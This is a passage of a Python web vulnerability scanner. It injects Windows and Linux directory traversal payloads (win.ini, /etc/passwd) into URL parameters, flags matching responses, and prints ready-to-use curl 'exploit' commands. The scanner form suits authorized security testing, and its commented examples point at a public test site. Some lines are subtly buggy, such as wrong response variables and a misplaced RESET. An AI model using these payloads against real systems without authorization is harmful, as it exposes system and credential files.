                #     print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)

                # Windows Directory Traversal 3 ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm"
                )
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
                    )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)

                trav_res = await session.get(traversal_url)
                try:
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(trav_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + traversal_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "boot loader" in http_response or "16-bit" in http_response:
                        print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s '"
                            + traversal_url
                            + "' | egrep Windows --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Windows Directory Traversal",
                        trav_res.status,
                        traversal_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(traversal_url) as trav_res:
                #   http_response = str(await trav_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "boot loader" in http_response or "16-bit" in http_response:
                #     print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)

                # Linux Directory Traversal ######################################################################################
                result_string = "benign"
                traversal_exploit = urllib.parse.quote(
                    "/../../../../../../../../../../../../../../../../../etc/passwd"
                )
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
                    )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)

                try:
                    http_request = urllib.request.urlopen(traversal_url)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()
                    json_list.append(json.dumps(dict(http_request.getheaders())))
                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + traversal_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "root:" in http_response:
                        print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s '"
                            + traversal_url
                            + "' | egrep root --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Linux Directory Traversal",
                        trav_res.status,
                        traversal_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                new_url = full_url + "INJECTX"

                # Linux Directory Traversal 2 ######################################################################################
                result_string = "benign"
                traversal_exploit = urllib.parse.quote(
                    "/../../../../../../../../../../../../../../../../../etc/passwd%00"
                )
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
                    )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)

                try:
                    http_request = urllib.request.urlopen(traversal_url)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()
                    json_list.append(json.dumps(dict(http_request.getheaders())))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + traversal_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "root:" in http_response:
                        print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s '"
                            + traversal_url
                            + "' | egrep root --color=auto"
                        ) + RESET
                        result_string = "vulnerable"

                    csvLine = [
                        "Linux Directory Traversal",
                        trav_res.status,
                        traversal_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

        for jsonItem in json_list:
            jsonFile.write(jsonItem)
            jsonFile.write("\n")

        print(
            OKORANGE
            + "______________________________________________________________________________________________________"
            + RESET
        )
        print(RESET)
        print(RESET)


async def wrapperMain(
    url,
    cookies="",
    verbose="y",
    csvWriter=None,
    csvReader=None,
    session=None,
    jsonFile=None,
):
    async with ClientSession() as session:
        await main(url=url, session=session, csvWriter=csvWriter, jsonFile=jsonFile)

    # tasks = []
    # async with ClientSession() as session:
    #   for row in csvReader:
    #     task = asyncio.create_task(main(row[1], cookies, verbose, csvWriter, session))
    #     tasks.append(task)
    #   await asyncio.gather(*tasks)


# fileCsvRead = open("../urls.csv", newline='')
# csvReader = csv.reader(fileCsvRead)
# fileCsvWrite = open("../res.csv", "w+", newline='')
# csvWriter = csv.writer(fileCsvWrite)
# fileJSON = open("../results.json", "w+", newline='\n')
# for row in csvReader:
#   asyncio.run(wrapperMain(row[1], csvWriter=csvWriter, jsonFile=fileJSON))
# asyncio.run(wrapperMain("http://testphp.vulnweb.com/", csvWriter=csvWriter))
# asyncio.run(wrapperMain("http://testphp.vulnweb.com/product.php?pic=5", csvWriter=csvWriter))

# asyncio.run(wrapperMain(url="http://testphp.vulnweb.com/"))
# main("http://testphp.vulnweb.com/")
